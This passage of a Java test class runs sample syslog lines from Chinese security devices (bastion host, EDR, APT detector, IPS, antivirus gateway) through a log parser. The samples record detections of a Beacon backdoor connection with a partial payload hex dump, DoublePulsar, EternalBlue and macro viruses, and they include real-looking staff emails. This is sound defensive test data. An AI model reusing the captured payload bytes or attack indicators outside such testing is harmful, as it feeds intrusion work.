      data = "<12>Jun 22 12:40:33 (none) : {\"dt\":\"VENUS_CS_0700R0605B20201029230950\",\"name\":\"MTAwMDAwMjkwLmRvYw==\",\"type\":\"1\",\"protocol\":\"FTP\",\"content\":\"{\\\"server_name\\\":\\\"MTkyLjE2OC4xNC4yMDc=\\\", \\\"user_name\\\":\\\"cm9vdA==\\\", \\\"file_direct\\\":\\\"0\\\", \\\"unzip_src\\\":\\\"\\\", \\\"unzip_layer\\\":\\\"0\\\"}\",\"file_type\":\"rtf\",\"md5\":\"b28c19037bf7ff38902287081ca24b93\",\"src_ip\":\"192.168.13.20\",\"dst_ip\":\"192.168.14.207\",\"src_port\":\"60583\",\"dst_port\":\"14849\",\"start_time\":\"1604310722\"}";
      parse(botuEngine, data);
      data = "<12>Jun 22 12:40:33 (none) : {\"ipGroupStr\":\"测试组\", \"statusStr\":\"初次发生\", \"level\":\"高\",\"ip\":\"10.51.52.142\", \"sceneName\":\"IP扫描\", \"time\":\"2020-11-05\", \"deviceName\":\"N/A\", \"threatStr\":\"低\"}";
      parse(botuEngine, data);
      data = "<12>Jun 22 12:40:33 (none) : CPU使用率4.00%，超过设定值1.00%";
      parse(botuEngine, data);*/
      data = "<12>Jun 22 12:40:33 (none) : {\"src_ip\": \"192.168.174.150\",\"src_ip_v6\": \"\",\"dst_ip\": \"192.168.174.132\",\"dst_ip_v6\": \"\",\"src_ip_country\": \"内网\",\"src_ip_city\": \"内网\",\"dst_ip_country\": \"内网\",\"dst_ip_city\": \"内网\",\"src_port\": 49159,\"dst_port\": 5566,\"src_mac\": \"00:0c:29:59:d9:20\",\"dst_mac\": \"00:0c:29:00:ad:dd\",\"exploited_host\": 2,\"exploited_ip\": \"192.168.174.150\",\"event_type_id\": 780,\"src_host_identity\": 2,\"dst_host_identity\": 3,\"attack_port\": 49159,\"attacked_port\": 5566,\"event_level_name\": \"高危\",\"security_id\": 30609,\"security_type\": \"木马后门\",\"attack_type\": \"远控后门\",\"protocol\": \"TCP\",\"subject\": \"TCP_后门_Beacon.Payload_连接\",\"attck\": \"\",\"detect_att_fail\": 1,\"apptype\": \"zombietrojanworm,Ransom\",\"stage_name\": \"\",\"stage_sub_name\": \"\",\"currency_name\": \"\",\"cve\": \"\",\"message\": \"7463702E7061796C6F61643D4D5AE8000000005B52455589E5\",\"mpls\": \"\",\"vlan\": \"\",\"attack_status\": \"正在利用\",\"organizations\": \"\",\"families\": \"\",\"categories\": \"\",\"ioc\": \"\",\"threat_score\": 0,\"intelligence_type_tag\": 0,\"raw_id\": \"bf8d9dff1ceab4a41eb128452ad8357f\",\"log_type\": \"event-log\",\"start_time\": 1666684166,\"dev_ip\": \"10.5.20.233\",\"dev_type\": \"APT\",\"index_date\": \"2022-10-25\",\"log_status\": \"待处置\",\"tcp_payload\": \"4D5AE8000000005B52455589E581C393450000FFD381C36662\"}";
      parse(botuEngine, data);
    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  public void testBastionSangfor() {
    String parserFile = "./resources/parsers/bastion_sangfor_osm-1000_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<33>Dec  1 22:56:29 fort i: <AUDIT_LOG>[新开普002](通过账号[xinkaipu002]登录)在[2020-12-01 20:17:31]到[2020-12-01 22:56:29]通过[192.168.42.165]访问[192.168.42.107],用[Administrator]账号通过[rdp]协议访问[192.168.42.107](资源类型[Windows Server 2012])。日志级别:[INFO]";
      parse(botuEngine, data);
      data = "<33>Dec  1 20:57:53 fort i: <AUDIT_LOG>[博达001](通过账号[boda001]登录在[2020-12-01 20:52:54]到[2020-12-01 20:57:52]通过[192.168.42.165]访问[192.168.82.85],用[root]账号通过[ssh2]协议访问[负载均衡服务器](资源类型[Centos])。日志级别:[INFO]";
      parse(botuEngine, data);
      data = "<33>Nov 25 14:46:34 fort i: 安全管理员(通过账号secadmin登录)，在2020-11-25 14:46:33通过192.168.39.5做添加[1]资源至[新开普]操作，操作成功。日志级别：[INFO]。";
      parse(botuEngine, data);
      data = "<33>Nov 18 10:29:56 fort i: sangfor(通过账号sangfor登录)，在2020-11-18 10:29:55通过192.168.39.25做登录(登录失败，您还剩4次机会)操作，操作失败。日志级别：[INFO]。";
      parse(botuEngine, data);
      data = "<33>Nov 18 10:29:56 fort i: [张三]通过账号[zhangsan]在[2015-03-17 17:49:49.0]访问[单点登录]时，触发[命令越权]告警，越权命令：rm。日志级别：[Alert]。";
      parse(botuEngine, data);
      data = "<33>Nov 18 10:29:56 fort i: [张三]通过账号[zhangsan]在[2015-03-17 17:49:49.0]做[登录]操作时，触发[账号锁定]告警。日志级别：[Alert]。";
      parse(botuEngine, data);
      data = "<33>Nov 18 10:29:56 fort i: [2015-03-17 17:49:49.0]服务器[192.168.23.17]的[内存]使用率超过最大值[90%]，触发[阈值越界]告警。日志级别：[Alert]。";
      parse(botuEngine, data);
      data = "<33>Dec  1 22:56:29 fort i: <AUDIT_LOG>[张三](通过账号[zhangsan]登录)在[2015-03-17 17:49:49.0]到[2015-03-17 17:49:56.0]通过[192.168.23.17]访问[192.168.23.223]，用[root]账号通过[ssh]协议访问[redhat服务器](资源类型[common linux])。日志级别：[INFO]";
      parse(botuEngine, data);
      data = "{auth} Fri Nov 22 16:48:10 GMT+08:00 2019 ALERT fort i: xjy(通过账号xjy登录)，在2019-11-22 16:48:09通过172.16.8.73做删除[1]操作，操作成功。日志级别：[INFO]。 172.16.8.19";
      parse(botuEngine, data);
      data = "<39>Aug 15 15:51:06 fort i: <AUDIT_LOG>[sysadmin](通过账号[sysadmin]登录在[2022-08-15 15:50:18]到[2022-08-15 15:51:05]通过[172.19.4.26]访问[192.168.254.128],用[root]账号通过[ssh2]协议";
      parse(botuEngine, data);
    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  public void testEpsTopsec() {
    String parserFile = "./resources/parsers/eps_topsec_topedr[1.13.15]_warn.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      // 系统升级
      String data = "client_ip=\"192.167.4.158\" version_dbtime=\"1538293122\" fid=\"18\" detail_timestamp=\"1553148478\" defense_type=\"other\" hostname=\"DESKTOP-PVBOC2L\" detail_auto=\"0\" group_name=\"test\" person=\"lyy\" client_id=\"EDC9F09257BCE7D87A857F698CDBBA1000000000\" detail_err=\"0\" detail_newversion_dbtime=\"1538293122\" time=\"1553148478\" fname=\"update\" detail_newversion_product=\"1.0.4.5\" version_product=\"1.0.4.5\"";
      parse(botuEngine, data);
      //病毒扫描日志
      data = "client_ip=\"192.167.4.220\" detail_threats=\"0\" version_dbtime=\"1538293122\" client_id=\"677907A7BDD89A53B8157C4C3A48865600000000\" defense_type=\"virus\" detail_sysrepair_fixed=\"0\" hostname=\"TOP\" detail_db_version=\"1538293122\" detail_sysrepair=\"0\" group_name=\"test\" time=\"1553133384\" person=\"测试\" detail_threat_killed=\"0\" detail_taskname=\"SCANTYPE_quick\" detail_tm_start=\"1553132947\" fname=\"scan\" version_product=\"1.0.4.5\" fid=\"0\" detail_threat_list=\"\" detail_objects=\"14861\" detail_duration=\"438\"";
      parse(botuEngine, data);
      data = "hostname=\"TOP\" detail_threat_list_mcs=\"1\" group_name=\"test\" version_dbtime=\"1538293122\" detection_method=\"DEFAULT\" detail_threat_list_virus_type=\"Trojan\" detail_db_version=\"1538293122\" detail_threat_list_virus_name=\"Generic!7081241BDE3CD5B9\" fid=\"0\" detail_threat_list_objn=\"C:\\Users\\Top\\Desktop\\edr\\病毒样本\\样本.zip >> 鏍锋湰\\troj\\16ffc95a5fd7a813965b768ca368405d57ffee3b\" detail_threat_list_id=\"134\" client_ip=\"192.167.4.220\" fname=\"scan\" detail_threat_list_cat=\"0\" defense_type=\"virus\" detail_taskname=\"SCANTYPE_custom\" client_id=\"677907A7BDD89A53B8157C4C3A48865600000000\" version_product=\"1.0.4.5\" detail_threat_list_clean=\"0\" detail_threat_list_fn=\"C:\\Users\\Top\\Desktop\\edr\\病毒样本\\样本.zip\" detail_threat_list_solid=\"0\" person=\"测试\" detail_threat_list_rid=\"-566438471\" time=\"1553138175\"";
      parse(botuEngine, data);
      data = "detail_sysrepair=\"0\" detail_threats=\"1\" version_dbtime=\"1538293122\" client_id=\"EDC9F09257BCE7D87A857F698CDBBA1000000000\" defense_type=\"virus\" detail_objects=\"1\" hostname=\"DESKTOP-PVBOC2L\" detail_db_version=\"1538293122\" client_ip=\"192.167.4.158\" group_name=\"test\" person=\"lyy\" detail_threat_killed=\"1\" detail_taskname=\"SCANTYPE_custom\" detail_tm_start=\"1553164713\" fid=\"0\" time=\"1553164722\" detail_sysrepair_fixed=\"0\" fname=\"scan\" detail_duration=\"0\" version_product=\"1.0.4.5\"";
      parse(botuEngine, data);
      //文件实时监控日志
      data = "group_name=\"CEO_总裁\" detail_virus_type=\"Backdoor\" detail_scan_mask=\"1\" detail_token=\"81\" detail_cmdline=\"/c C:\\Windows\\AppDiagnostics\\\\svchost.exe > C:\\Windows\\AppDiagnostics\\\\process1.txt\" detail_threats=\"1\" version_dbtime=\"1552902390\" detail_file_path=\"C:\\Windows\\AppDiagnostics\\svchost.exe\" detection_method=\"DEFAULT\" detail_virus_name=\"DoublePulsar.b\" hostname=\"WIN-FADFQIF65S5\" detail_xpid=\"164868\" detail_task=\"91988016\" client_ip=\"192.168.67.202\" detail_treatment=\"2\" detail_parent_cmd=\"C:\\Windows\\system32\\msdtc.exe\" defense_type=\"virus\" time=\"1553052779\" detail_result=\"3\" detail_solid=\"1\" client_id=\"1209F5115CF2D78DBDA4E9FDA2B607F500000000\" version_product=\"1.0.6.1\" fid=\"1\" person=\"上网服务器\" detail_proc_path=\"C:\\Windows\\system32\\cmd.exe\" fname=\"filemon\" detail_virus_id=\"4FA4C9A30AE890D5\" virus_name=\"DoublePulsar.b\" virus_type=\"Backdoor\"";
      parse(botuEngine, data);
      //下载保护日志
      data = "group_name=\"test\" detail_virus_type=\"OMacro\" detail_scan_mask=\"256\" detail_token=\"1\" detail_cmdline=\"\\\"C:\\Program Files (x86)\\Tencent\\QQ\\Bin\\QQ.exe\\\" /hosthwnd=591702 /hostname=QQ_IPC_{DB5041D8-0097-424E-BC11-286C0A2916ED} /memoryid=0 \\\"C:\\Program Files (x86)\\Tencent\\QQ\\Bin\\QQ.exe\\\" \" detail_threats=\"1\" version_dbtime=\"1538293122\" detail_file_path=\"C:\\Users\\Top\\Desktop\\宏病毒02.doc\" detection_method=\"DEFAULT\" detail_virus_name=\"Concept.i\" hostname=\"TOP\" detail_xpid=\"0\" detail_task=\"68542488\" client_ip=\"192.167.4.220\" detail_treatment=\"2\" detail_parent_cmd=\"\" defense_type=\"virus\" time=\"1553157183\" detail_result=\"4\" detail_solid=\"0\" client_id=\"677907A7BDD89A53B8157C4C3A48865600000000\" version_product=\"1.0.4.5\" fid=\"3\" person=\"测试\" detail_proc_path=\"C:\\Program Files (x86)\\Tencent\\QQ\\Bin\\QQ.exe\" fname=\"dlmon\" detail_virus_id=\"0E684680B96C3DBD\"";
      parse(botuEngine, data);
      //软件安装拦截
      data = "group_name=\"test\" detail_token=\"0\" detail_cmdline=\"C:\\Windows\\Explorer.EXE\" version_dbtime=\"1538293122\" detail_file_path=\"C:\\Users\\Top\\Desktop\\edr\\软件安装拦截\\haozip_5.9.5.10808.exe\" person=\"测试\" hostname=\"TOP\" detail_xpid=\"12276\" detail_task=\"43563088\" detail_software_id=\"FB263727F6EE9A4E\" client_ip=\"192.167.4.220\" fname=\"instmon\" detail_parent_cmd=\"\" defense_type=\"system\" client_id=\"677907A7BDD89A53B8157C4C3A48865600000000\" version_product=\"1.0.4.5\" detail_treatment=\"3\" detail_runcmd=\"\\\"C:\\Users\\Top\\Desktop\\edr\\软件安装拦截\\haozip_5.9.5.10808.exe\\\" \" fid=\"17\" detail_software_name=\"Software:Setup/HaoZip#好压\" detail_proc_path=\"C:\\Windows\\Explorer.EXE\" time=\"1553134085\"";
      parse(botuEngine, data);
      //U盘保护日志
      data = "group_name=\"test\" detail_virus_type=\"OMacro\" detail_scan_mask=\"0\" detail_token=\"2\" detail_cmdline=\"\" detail_threats=\"1\" version_dbtime=\"1538293122\" detail_file_path=\"G:\\宏病毒02.doc\" detection_method=\"DEFAULT\" detail_virus_name=\"Concept.i\" hostname=\"TOP\" detail_xpid=\"0\" detail_task=\"87116072\" client_ip=\"192.167.4.220\" detail_treatment=\"2\" detail_parent_cmd=\"\" defense_type=\"virus\" time=\"1553154192\" detail_result=\"4\" detail_solid=\"0\" client_id=\"677907A7BDD89A53B8157C4C3A48865600000000\" version_product=\"1.0.4.5\" fid=\"4\" person=\"测试\" detail_proc_path=\"\" fname=\"udiskmon\" detail_virus_id=\"0E684680B96C3DBD\"";
      parse(botuEngine, data);
      //系统加固日志
      data = "client_id=\"677907A7BDD89A53B8157C4C3A48865600000000\" detail_montype=\"2\" group_name=\"test\" detail_cmdline=\"\"C:\\Users\\Top\\Desktop\\edr\\系统加固\\注册表保护-IE首页项.exe\" \" detail_actiontype=\"4\" detail_res_cmd=\"\" version_dbtime=\"1538293122\" detail_RuleID=\"34\" hostname=\"TOP\" fid=\"5\" detail_res_val=\"hips test value\" client_ip=\"192.167.4.220\" detail_level=\"3\" detail_treatment=\"3\" detail_parent_cmd=\"C:\\Windows\\Explorer.EXE\" defense_type=\"system\" detail_res_path=\"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Internet Explorer\\Main\\Start Page\" time=\"1553149001\" detail_group_name=\"IE首页项\" version_product=\"1.0.4.5\" detail_description=\"保护IE首页不被篡改\" person=\"测试\" detail_class=\"1\" detail_proc_path=\"C:\\Users\\Top\\Desktop\\edr\\系统加固\\注册表保护-IE首页项.exe\" fname=\"sysprot\" detail_actionid=\"6\"";
      parse(botuEngine, data);
      ////恶意网站拦截
      data = "client_ip=\"192.168.67.193\" version_dbtime=\"1552902390\" fid=\"15\" defense_type=\"network\" hostname=\"SGTESTRAC\" group_name=\"上网服务器\" person=\"192.168.67.193\" detail_proc_path=\"C:\\Program Files\\快压\\X86\\KZReport.exe\" detail_type=\"spy\" client_id=\"416C9FC06522D0AF38BCA3D239BEA04500000000\" version_product=\"1.0.6.1\" detail_url=\"i.kpzip.com/n/report/queryinfo.xml\" fname=\"malsite\" time=\"1553052578\"";
      parse(botuEngine, data);
      //恶意行为监控日志
      data = "group_name=\"浜戝畨鍏ㄤ骇鍝佺嚎\" detail_virus_type=\"Trojan\" detail_cmdline=\"D:\\Program Files\\Microsoft Office\\Office16\\OUTLOOK.EXE\" detail_mail_from=\"yang_jin@topsec.com.cn\" detail_threats=\"1\" version_dbtime=\"1553243115\" detail_file_path=\"C:\\WINDOWS\\temp\\HRMail\\3556.eml\" detection_method=\"DEFAULT\" detail_virus_name=\"Linux.Xorddos.a\" hostname=\"YANGJIN-PC\" fid=\"43\" detail_mail_subject=\"娴嬭瘯閭?浠?-甯︾梾姣掓牱鏈檮浠\" client_ip=\"192.168.35.11\" detail_mail_to=\"yang_jin@topsec.com.cn\" detail_treatment=\"2\" defense_type=\"virus\" detail_mail_cc=\"yangjie@topsec.com.cn\" client_id=\"958DE6F408AD9A36D586AA0A1BD003CB00000000\" version_product=\"1.0.6.2\" person=\"鏉ㄨ繘\" detail_proc_path=\"D:\\Program Files\\Microsoft Office\\Office16\\OUTLOOK.EXE\" time=\"1553499130\" fname=\"mail\" detail_virus_id=\"F01190FFF87750CD\" virus_name=\"Linux.Xorddos.a\" virus_type=\"Trojan\"";
      parse(botuEngine, data);
      //黑客入侵拦截日志
      data = "detail_raddr=\"-1062714609\" group_name=\"上网服务器\" detail_type=\"0\" detail_laddr=\"-1062714428\" detail_cmdline=\"\" detail_protocol=\"6\" version_dbtime=\"1552902390\" hostname=\"WIN-Q8QB1BMQV10\" detail_outbound=\"0\" fname=\"instrusion\" detail_rport=\"54543\" client_ip=\"192.168.67.196\" detail_blocked=\"1\" fid=\"30\" detail_parent_cmd=\"\" detail_lport=\"445\" client_id=\"B574947B0699564F78BF0EA7FD0AF6B700000000\" version_product=\"1.0.6.1\" detail_name=\"Exploit/EternalBlue\" person=\"192.168.67.196\" detail_proc_path=\"System\" time=\"1553052616\"";
      parse(botuEngine, data);
      //IP黑名单
      data = "detail_raddr=\"-1407908045\" group_name=\"test\" detail_type=\"1\" detail_laddr=\"-1062796068\" detail_cmdline=\"\" detail_protocol=\"6\" version_dbtime=\"1538293122\" hostname=\"TOP\" detail_outbound=\"1\" fid=\"33\" detail_rport=\"3389\" client_ip=\"192.167.4.220\" detail_blocked=\"1\" fname=\"ipblacklist\" detail_parent_cmd=\"\" defense_type=\"network\" detail_lport=\"59225\" client_id=\"677907A7BDD89A53B8157C4C3A48865600000000\" version_product=\"1.0.4.5\" detail_name=\"\" detail_memo=\"\" person=\"测试\" detail_proc_path=\"Idle\" time=\"1553143391\"";
      parse(botuEngine, data);
      //IP协议控制
      data = "detail_raddr=\"-1407908045\" group_name=\"test\" detail_type=\"0\" detail_laddr=\"-1062796068\" detail_cmdline=\"\" detail_protocol=\"6\" version_dbtime=\"1538293122\" hostname=\"TOP\" detail_outbound=\"1\" fname=\"ipproto\" detail_rport=\"3389\" client_ip=\"192.167.4.220\" detail_blocked=\"1\" fid=\"32\" detail_parent_cmd=\"\" defense_type=\"network\" detail_lport=\"59341\" client_id=\"677907A7BDD89A53B8157C4C3A48865600000000\" version_product=\"1.0.4.5\" detail_name=\"ip协议测试\" person=\"测试\" detail_proc_path=\"Idle\" time=\"1553143608\"";
      parse(botuEngine, data);
      //恶意行为监控日志
      data = "group_name=\"浜戝畨鍏ㄤ骇鍝佺嚎\" origin_control_check_visible=\"1\" origin_processes_master_cmdline=\"\\\"D:\\\\Youdao\\\\Dict\\\\YoudaoDict.exe\\\" -hide -autostart\" origin_tid=\"1180\" detail_file_path=\"D:\\\\Youdao\\\\Dict\\\\YoudaoDict.exe\" origin_name=\"Trojan/Generic.AA!1.0\" detail_virus_name=\"Generic.AA!1.0\" hostname= \"YXJ-PC\" origin_processes_master_pathname= \"D:\\\\Youdao\\\\Dict\\\\YoudaoDict.exe\" detail_cmdline=\"\\\"D:\\\\Youdao\\\\Dict\\\\YoudaoDict.exe\\\" -hide -autostart\" fid=\"2\" origin_processes_master_pid=\"3020\" detail_level=\"3\" detail_treatment=\"2\" detail_parent_cmd=\"\" defense_type=\"virus\"  client_id=\"53E98DA772010BECDEB85A5C06B9B8E300000000\" version_product=\"1.0.6.1\" detection_method=\"BEHAV\" person=\"农世松\" origin_risk=\"3\" time=\"1552615969\" fname=\"behavior\" virus_name=\"Generic.AA!1.0\" virus_type=\"Trojan\"";
      parse(botuEngine, data);
      //对外攻击检测日志
      data = "client_ip=\"192.168.25.102\" version_dbtime=\"1533295173\" detail_raddr=\"1746512064\" detail_parent_cmd=\"C:\\Windows\\Explorer.EXE\" defense_type=\"network\" hostname=\"D0077-WSJ\" group_name=\"浜у搧绾跨?＄悊涓?蹇\" person=\"鐜嬫窇濞\" client_id=\"0B04BF55C52852EEDCD5261009F3391802020000\" detail_cmdline=\"\\\"E:\\FeiQ3.1.1.1.exe\\\"  1\" fid=\"31\" time=\"1553494230\" detail_flood_type=\"1\" detail_proc_path=\"E:\\FeiQ3.1.1.1.exe\" fname=\"ipattack\" version_product=\"1.0.3.1\"";
      parse(botuEngine, data);
      //邮件监控
      data = "group_name=\"浜戝畨鍏ㄤ骇鍝佺嚎\" detail_virus_type=\"Trojan\" detail_cmdline=\"D:\\Program Files\\Microsoft Office\\Office16\\OUTLOOK.EXE\" detail_mail_from=\"yang_jin@topsec.com.cn\" detail_threats=\"1\" version_dbtime=\"1553243115\" detail_file_path=\"C:\\WINDOWS\\temp\\HRMail\\3556.eml\" detection_method=\"DEFAULT\" detail_virus_name=\"Linux.Xorddos.a\" hostname=\"YANGJIN-PC\" fid=\"43\" detail_mail_subject=\"娴嬭瘯閭?浠?-甯︾梾姣掓牱鏈檮浠\" client_ip=\"192.168.35.11\" detail_mail_to=\"yang_jin@topsec.com.cn\" detail_treatment=\"2\" defense_type=\"virus\" detail_mail_cc=\"yangjie@topsec.com.cn\" client_id=\"958DE6F408AD9A36D586AA0A1BD003CB00000000\" version_product=\"1.0.6.2\" person=\"鏉ㄨ繘\" detail_proc_path=\"D:\\Program Files\\Microsoft Office\\Office16\\OUTLOOK.EXE\" time=\"1553499130\" fname=\"mail\" detail_virus_id=\"F01190FFF87750CD\" virus_name=\"Linux.Xorddos.a\" virus_type=\"Trojan\"";
      parse(botuEngine, data);
      //基本信息
      data = "Dec 13 16:09:25 172.19.30.112 mem=\"0.000000\" ip=\"127.0.0.1\" device_type=\"TopAV\" disk=\"23.000000\" cpu=\"0.000000\" device_id=\"locahost\"";
      parse(botuEngine, data);
    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  //
  public void testIdsH3c() {
    String parserFile = "./resources/parsers/ips_h3c_ips_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<188>Feb 24 13:13:09 2021 HIHK-0898-MAKJCIDC-MAKJC01-H3C-T9008-01 %%10DPI/4/DAC_STORE_STATE_FULL: -Chassis=2-Slot=3.1; The storage space-based alarm threshold (AlarmThreshold(1121)=20%) set for StoreName(1119)=TRAFFIC was exceeded.";
      parse(botuEngine, data);
      data = "<189>Feb 24 12:53:40 2021 HIHK-0898-MAKJCIDC-MAKJC01-H3C-T9008-01 %%10SYSLOG/5/LOGFILE_USAGEHIGH: The usage of log-file flash:/logfile/atk_single.log reaches 80%.";
      parse(botuEngine, data);
      data = "<188>Feb 24 08:45:13 2021 HIHK-0898-MAKJCIDC-MAKJC01-H3C-T9008-01 %%10ATK/4/ATK_ICMPV6_TRACEROUTE_SZ: -Chassis=1-Slot=3.1; SubModule(1127)=SINGLE; SrcZoneName(1025)=Untrust; SrcIPv6Addr(1036)=240e:958:6002::27; DstIPv6Addr(1037)=240e:914:a001:1:8000::5; RcvVPNInstance(1042)=; Action(1053)=logging; BeginTime_c(1011)=20210224084013; EndTime_c(1012)=20210224084513; AtkTimes(1054)=1.";
      parse(botuEngine, data);
      data = "<187>Feb 24 08:41:37 2021 HIHK-0898-MAKJCIDC-MAKJC01-H3C-T9008-01 %%10ATK/3/ATK_ICMPV6_FLOOD_SZ: -Chassis=1-Slot=3.1; SrcZoneName(1025)=Untrust; DstIPv6Addr(1037)=240e:914:a001:1::41; RcvVPNInstance(1042)=; UpperLimit(1049)=1000; Action(1053)=logging; BeginTime_c(1011)=20210224084137.";
      parse(botuEngine, data);
      data = "<187>Feb 24 08:41:35 2021 HIHK-0898-MAKJCIDC-MAKJC01-H3C-T9008-01 %%10ATK/3/ATK_IP4_ACK_FLOOD_SZ: -Chassis=1-Slot=3.1; SrcZoneName(1025)=Untrust; DstIPAddr(1007)=139.189.223.235; RcvVPNInstance(1042)=; UpperLimit(1049)=1000; Action(1053)=logging; BeginTime_c(1011)=20210224084135.";
      parse(botuEngine, data);
      data = "<190>Feb 24 08:44:43 2021 HIHK-0898-MAKJCIDC-MAKJC01-H3C-T9008-01 %%10FILTER/6/FILTER_ZONE_IPV4_EXECUTION: -Chassis=1-Slot=3.1; SrcZoneName(1025)=Untrust;DstZoneName(1035)=Untrust;Type(1067)=ACL;SecurityPolicy(1072)=IPS;RuleID(1078)=5;Protocol(1001)=TCP;Application(1002)=other;SrcIPAddr(1003)=124.225.89.1;SrcPort(1004)=80;SrcMacAddr(1021)=8ce5-ef7a-4902;DstIPAddr(1007)=140.240.61.149;DstPort(1008)=3931;MatchCount(1069)=256;Event(1048)=Permit;";
      parse(botuEngine, data);
      data = "<188>Feb 24 08:44:33 2021 HIHK-0898-MAKJCIDC-MAKJC01-H3C-T9008-01 %%10UFLT/4/UFLT_LICENSE_UNAVAILABLE: -Chassis=2-Slot=3.1;  The feature UFLT has no available license.";
      parse(botuEngine, data);
      data = "<185>Feb 24 08:40:02 2021 HIHK-0898-MAKJCIDC-MAKJC01-H3C-T9008-01 %%10DIAG/1/MEM_EXCEED_THRESHOLD: -Chassis=1-Slot=3.1; Memory minor threshold has been exceeded.";
      parse(botuEngine, data);
      data = "<188>Feb 24 08:40:01 2021 HIHK-0898-MAKJCIDC-MAKJC01-H3C-T9008-01 %%10DIAG/4/MEM_ALERT: -Chassis=1-Slot=3.1;  system memory info:              total       used       free     shared    buffers     cached Mem:      16412828   14836060    1576768          0         36     365428 -/+ buffers/cache:   14470596    1942232 Swap:            0          0          0";
      parse(botuEngine, data);
      data = "<189>Feb 24 08:55:19 2021 HIHK-0898-MAKJCIDC-MAKJC01-H3C-T9008-01 %%10WEB/5/LOGOUT: zhangcm �� 202.100.192.23 �˳���¼.";
      parse(botuEngine, data);
    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  public void testAptTopsec() {
    String parserFile = "./resources/parsers/apt_topsec_topapt[3.6.2.20190518]_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<137>Jun 12 14:55:35 localhost LogFile=\"File\";Time=\"2019-06-12 12:25:39 +0800\";SIP=\"101.129.2.223\";DIP=\"111.206.53.16\";SPort=\"27617\";DPort=\"80\";SGEO=\"cn\";DGEO=\"cn\";Proto=\"HTTP\";Level=\"1\";Filename=\"http_noname.txt\";Type=\"cab\";MD5=\"504d57bf331e4d4fa5553789e46d0df0\";AttackerIP=\"111.206.53.16\";GEO=\"cn\";PID=\"0\";FID=\"1560322465266040087\";From=\"http%3A%2F%2Fupdatem.360safe.com%2Fv3%2Fsafeup_miniup.cab%3Fautoupdate%3Dtrue%26pid%3Dh_home%26uid%3D1%26mid%3Dd8dcbe6b184c6bfebf1d0796596ca5de%26ver%3D9.0.0.3100%26sysver%3D6.1.7601.256.1.1%26pa%3Dx86%26type%3Dtray%26rt%3D0%26lt%3D0%26ue%3D1%26language%3Dchs\";Hash=\"NA\";AV=\"No virus detected\";Behav=\"1\";Remark=\"\";";
      parse(botuEngine, data);
      data = "<137>Sep 13 16:51:15 localhost LogType=\"Vulns\";Time=\"2018-09-13 16:50:53 +0800\";SrcIP=\"192.168.12.196\";DstIP=\"192.168.12.89\";SPort=\"33245\";DPort=\"445\";AP=\"SMB\";PIP=\"0\";AttackerIP=\"192.168.12.196\";GEO=\"00\";Level=\"4\";RuleID=\"FSID_00016887\";RVal=\"Exploit.MS17-010.To_Server.A\";Category=\"0\";";
      parse(botuEngine, data);
    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  public void testAntiVirusTopsec() {
    String parserFile = "./resources/parsers/antivirus_topsec_gateway[3.3.017.051.1]_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "Jul 10 16:27:10 172.18.33.171 id=tos time=\"2020-07-10 16:26:55\" fw=TopsecOS  pri=5 type=mgmt user=superman src=192.168.152.30 result=-1 recorder=config msg=\"ar custom modify name FTP ports 'tcp|21 ';error -27007 : 对象不存在\"";
      parse(botuEngine, data);
      data = "id=tos time=\"2013-04-09 16:36:47\" fw=TopsecOS pri=4 type=dpi proto=smtp user=192.168.99.59 src=192.168.99.59 dst=192.168.1.169 sport=14844 dport=25 sender=gong_chao@topsec.com.cn receiver=\"gong_chao@topsec.com.cn\" cc=\"N/A\" bcc=\"N/A\" subject=\"sss\"  filename=\"aa.tt\" filetype=\"N/A\" filter=filename action=forbid";
      parse(botuEngine, data);
      data = "Jul 10 16:28:16 172.18.33.171 id=tos time=\"2020-07-10 16:27:59\" fw=TopsecOS  pri=4 type=avse proto=http user=N/A src=10.0.0.10 dst=10.0.0.2 sport=64363 dport=80 method=GET url=http://10.0.0.2/test/virus/deep/eicarcom2.zip title=\"N/A\" urltype=\"N/A\" filetype=\"N/A\" virus_name=Virus.EICAR-Test-File virus_deal=delete";
      parse(botuEngine, data);
      data = "Jul 10 16:26:44 172.18.33.171 id=tos time=\"2020-07-10 16:26:28\" fw=TopsecOS  pri=4 type=avse proto=ftp user=N/A src=10.0.0.10 dst=10.0.0.2 sport=52295 dport=21 filename=\"!!AABBCC_00000037\" command=\"RETR\" filetype=\"N/A\" virus_name=Heur:Backdoor.Ghos virus_deal=delete";
      parse(botuEngine, data);
    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  public void testAcmTopsec() {
    String parserFile = "./resources/parsers/acm_topsec_topacm[3.0.0216p1]_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "Type=URL; Source=59.203.180.210:27286; Dest=119.90.53.244:80; Username=59.203.180.210; Show Name=59.203.180.210; Group=Root/; Host=chat1.ybk001.com; Catevalue=127; URL=http://chat1.ybk001.com/hqtchat408.asp?id=20181130125944; Time=2018-11-30 18:11:07;";
